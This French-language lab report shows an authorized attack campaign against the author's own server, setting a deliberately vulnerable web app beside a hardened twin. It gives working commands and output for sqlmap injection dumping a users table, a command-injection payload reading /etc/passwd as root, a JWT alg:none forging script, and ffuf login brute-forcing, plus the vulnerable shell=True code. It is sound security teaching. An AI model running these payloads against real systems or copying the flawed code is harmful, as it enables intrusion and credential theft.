# PREUVES_KALI — Comparatif attaque / défense (J5)

> **Objet** : campagne offensive menée depuis **Kali Linux** contre les deux jumeaux
> applicatifs déployés en production sur le droplet, pour démontrer côte à côte que
> `secure_app` **bloque** les attaques que `vuln_app` **laisse passer**.
>
> **Cibles** (droplet `64.226.106.122`) :
> - `secure_app` → `http://64.226.106.122:8001` (durci : non-root, `cap_drop ALL`, read-only, headers, rate-limit)
> - `vuln_app`  → `http://64.226.106.122:8002` (volontairement troué — **éphémère**, démo uniquement)
>
> **Cadre légal** : cibles = mon propre droplet, consentement explicite. Aucune charge
> destructrice. La cible `vuln_app` est éteinte et son port refermé après la démo.

---

## 0. Mise en place (variables d'environnement)

```bash
SECURE=http://64.226.106.122:8001
VULN=http://64.226.106.122:8002
```

Outils Kali utilisés : **sqlmap**, **commix** (+ payload manuel), **ffuf**, **python3**
(forge JWT), **wget** (transport des requêtes authentifiées). Aucune dépendance à `curl`.

---

## 1. Injection SQL — `sqlmap`

### Cible vulnérable → table `users` dumpée

```bash
sqlmap -u "$VULN/auth/login" --method POST \
  --headers="Content-Type: application/json" \
  --data='{"username":"alice*","password":"x"}' \
  --dbms=sqlite --ignore-code=401 \
  --technique=B --threads=1 --time-sec=2 \
  --flush-session --batch --level=5 --risk=3 \
  --dump -T users
```

> `--ignore-code=401` : le login renvoie 401 sur la requête de test ; sans ça sqlmap
> abandonne. `--technique=B` : on se limite au boolean-based blind (les payloads
> time-based lourds faisaient tomber le worker uvicorn de la cible).

**Résultat — injection confirmée + dump intégral :**

```
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)
    Payload: {"username":"alice%' OR NOT 9856=9856-- Jzlt","password":"x"}

Database: <current>
Table: users [2 entries]
+--------------------------------------+---------+-------------------+----------+
| id                                   | email   | password          | username |
+--------------------------------------+---------+-------------------+----------+
| 5af32ffe-8a24-4acc-8675-e8b02fd66f89 | a@x.com | Sup3r-S3cret!Pass | alice    |
| c31deeec-ff1d-48c5-9c56-decaae8fff9e | b@x.com | Sup3r-S3cret!Pass | bob      |
+--------------------------------------+---------+-------------------+----------+
```

Bonus : sqlmap a extrait le schéma révélant le commentaire source
`-- VULN J3 : mot de passe stocké EN CLAIR` → **double faille** (SQLi + secrets en clair).

### Cible sécurisée → non injectable + rate-limit

```bash
sqlmap -u "$SECURE/auth/login" --method POST \
  --headers="Content-Type: application/json" \
  --data='{"username":"alice*","password":"x"}' \
  --dbms=sqlite --ignore-code=401 \
  --technique=B --threads=1 \
  --flush-session --batch --level=5 --risk=3 \
  --dump -T users
```

**Résultat :**

```
[CRITICAL] all tested parameters do not appear to be injectable.
HTTP error codes detected during run:
401 (Unauthorized) - 5 times, 429 (Too Many Requests) - 686 times
```

→ Requêtes **paramétrées** (injection impossible) **ET** rate-limiter (`429 × 686`).

---

## 2. Command injection — endpoint `/tools/ping`

Code vulnérable (`vuln_app/main.py`) :

```python
cmd = f"ping -c 1 {data.host}"
proc = subprocess.run(cmd, shell=True, ...)   # shell=True + f-string = RCE
return {..., "output": proc.stdout + proc.stderr, "cmd": cmd}
```

Récupération d'un token (le mot de passe vient du dump sqlmap) :

```bash
TOKEN_VULN=$(wget -qO- --header='Content-Type: application/json' \
  --post-data='{"username":"alice","password":"Sup3r-S3cret!Pass"}' \
  "$VULN/auth/login" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

### Cible vulnérable → RCE en `root`

```bash
wget -qO- --header="Content-Type: application/json" \
  --header="Authorization: Bearer $TOKEN_VULN" \
  --post-data='{"host":"127.0.0.1; id; hostname; cat /etc/passwd | head -3"}' \
  "$VULN/tools/ping"
```

**Résultat (champ `output`) :**

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.118 ms
...
uid=0(root) gid=0(root) groups=0(root)        ← `id` exécuté
9a12cec8517b                                   ← hostname conteneur
root:x:0:0:root:/root:/bin/bash                ← /etc/passwd lu
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

→ **RCE confirmé**, et le conteneur vuln tourne en `uid=0(root)` (aucun durcissement),
là où la stack durcie impose `user 1000:1000`, `cap_drop ALL`, `read_only`,
`no-new-privileges`. **Double écart : faille applicative + absence de durcissement.**

### Cible sécurisée → `400`, injection neutralisée

```bash
wget -S -qO- --header='Content-Type: application/json' \
  --header="Authorization: Bearer $TOKEN_SEC" \
  --post-data='{"host":"127.0.0.1; id"}' \
  "$SECURE/tools/ping"
```

**Résultat :**

```
HTTP/1.1 400 Bad Request
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: no-referrer
cross-origin-opener-policy: same-origin
cross-origin-resource-policy: same-origin
content-security-policy: default-src 'none'; frame-ancestors 'none'
permissions-policy: geolocation=(), microphone=(), camera=()
strict-transport-security: max-age=63072000; includeSubDomains
cache-control: no-store
```

→ Host validé (`shell=False`) → `400`, **aucun `uid=`**. Bonus : **8 en-têtes de
sécurité** absents de vuln_app.

---

## 3. JWT `alg:none` — forge de token

Le token vuln a pour signature littérale `insecuresignature` → la signature n'est pas
vérifiée. Forge d'un token `alg:none` (signature vide) reprenant les claims :

```bash
FORGED_NONE=$(python3 - "$TOKEN_VULN" <<'EOF'
import sys, base64, json
h, p, s = sys.argv[1].split('.')
b64d = lambda x: base64.urlsafe_b64decode(x + '='*(-len(x) % 4))
b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
payload = json.loads(b64d(p))
header = {"alg": "none", "typ": "JWT"}
print(b64e(json.dumps(header, separators=(',', ':')).encode()) + "." +
      b64e(json.dumps(payload, separators=(',', ':')).encode()) + ".")
EOF
)
```

> Équivalent outil dédié : `jwt_tool "$TOKEN_VULN" -X a` (non packagé sur Kali ;
> `git clone https://github.com/ticarpi/jwt_tool` puis `python3 jwt_tool.py ... -X a`).

### Cible vulnérable → `200`, compte usurpé

```bash
wget -S -qO- --header="Authorization: Bearer $FORGED_NONE" "$VULN/users/me"
```

**Résultat :**

```
HTTP/1.1 200 OK
{"id":"c31deeec-...","username":"alice","email":"a@x.com","password":"Sup3r-S3cret!Pass"}
```

→ Token à **signature vide** accepté → usurpation + fuite du mot de passe en clair.

### Cible sécurisée → `401`

```bash
wget -S -qO- --header="Authorization: Bearer $FORGED_NONE" "$SECURE/users/me"
```

**Résultat :**

```
HTTP/1.1 401 Unauthorized
```

→ Whitelist d'algorithmes (HS256 uniquement) → `alg:none` rejeté.

---

## 4. Brute-force du login — `ffuf`

```bash
printf '%s\n' password 123456 admin letmein motdepasse 'Sup3r-S3cret!Pass' azerty qwerty > /tmp/wl.txt

# VULN : aucun rate-limit
ffuf -w /tmp/wl.txt -u "$VULN/auth/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"FUZZ"}' -mc 200 -t 10

# SECURE : rate-limiter
ffuf -w /tmp/wl.txt -u "$SECURE/auth/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"FUZZ"}' -mc 200,429 -t 10
```

**Résultats :**

```
VULN   Sup3r-S3cret!Pass   [Status: 200]    ← mot de passe deviné, aucune limite

SECURE letmein             [Status: 429]
       Sup3r-S3cret!Pass   [Status: 429]    ← même le BON mdp est étranglé
       azerty              [Status: 429]
```

→ Sur secure, **même la combinaison valide ressort en `429`** : le rate-limiter coupe
la rafale avant tout aboutissement. Brute-force neutralisé.

---

## 5. Synthèse comparative

| # | Attaque | Outil Kali | vuln_app (8002) | secure_app (8001) | Contrôle défensif |
|---|---------|-----------|-----------------|-------------------|-------------------|
| 1 | Injection SQL | sqlmap | table `users` dumpée | `not injectable` + 429 | Requêtes paramétrées |
| 2 | Command injection | payload `/tools/ping` | `200` → `uid=0(root)` | `400` host rejeté | `subprocess shell=False` + validation |
| 3 | JWT `alg:none` | python / jwt_tool | `200` compte usurpé | `401` rejeté | Whitelist algos HS256 |
| 4 | Brute-force | ffuf | `200` mdp trouvé | `429` étranglé | Rate-limiter sliding-window |
| 5 | Secrets en clair | (transverse) | mot de passe lisible ×3 | Argon2id + JWT signé | Hachage + signature |

**Couches d'écart supplémentaires côté secure_app :** 8 en-têtes de sécurité HTTP,
conteneur non-root (`1000:1000`), `cap_drop ALL`, rootfs read-only, `no-new-privileges`,
secret fail-closed (refus de démarrer sans clé ≥ 32 car.).

> Visualisation temps réel : dashboard Grafana **« Comparatif secure_app vs vuln_app »**
> (table `app_requests`, télémétrie middleware) — `http://64.226.106.122:3000`.

---

## 6. Démontage post-démo

`vuln_app` est une cible volontairement trouée, exposée sur Internet et tournant en
`root` : elle est éteinte et son port refermé dès la fin des captures.

```bash
ssh root@64.226.106.122 'cd ~/honeypot-m1spro/vuln_app && docker compose down -v && ufw delete allow 8002/tcp'
```
